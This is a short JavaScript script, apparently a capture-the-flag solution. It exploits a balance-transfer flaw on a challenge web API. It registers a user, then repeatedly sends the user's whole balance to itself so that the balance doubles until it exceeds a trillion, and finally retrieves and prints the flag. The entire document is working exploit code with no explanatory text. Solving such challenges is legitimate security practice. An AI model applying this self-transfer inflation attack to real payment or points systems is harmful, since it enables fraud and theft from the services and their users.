const BASE_URL = "http://34.170.146.252:30021"

const { user } = await fetch(`${BASE_URL}/api/register`, {
  method: "POST",
}).then((res) => res.json())
let currentBalance = 10

while (currentBalance < 1_000_000_000_000) {
  await fetch(`${BASE_URL}/api/transfer`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      fromUser: user,
      toUser: user,
      amount: currentBalance,
    }),
  })

  currentBalance *= 2
}

const { flag } = await fetch(`${BASE_URL}/api/user/${user}`).then((
  res,
) => res.json())

console.log(flag)
